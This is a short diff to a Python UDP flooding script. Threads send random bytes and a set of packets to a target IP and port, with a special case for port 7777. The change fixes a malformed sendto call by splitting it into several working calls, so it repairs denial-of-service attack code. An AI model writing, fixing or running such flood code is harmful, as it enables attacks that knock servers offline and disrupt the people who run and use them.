@@ -73,7 +73,11 @@ class MyThread(threading.Thread):
            flood = random._urandom(1024)
            spel = random._urandom(1677)
            sock.sendto(flood, (ip, int(port)))
-           sock.sendto(spel,Pacotes[1],Pacotes[2],Pacotes[3],Pacotes[4],Pacotes[5], (ip, int(port)))
+           sock.sendto(spel, (ip, int(port)))
+           sock.sendto(Pacotes[1], (ip, int(port)))
+           sock.sendto(Pacotes[2], (ip, int(port)))
+           sock.sendto(Pacotes[3], (ip, int(port)))
+           sock.sendto(Pacotes[4], (ip, int(port)))
            
          if(int(port) == 7777):
            sock.sendto(Pacotes[5], (ip, int(port)))
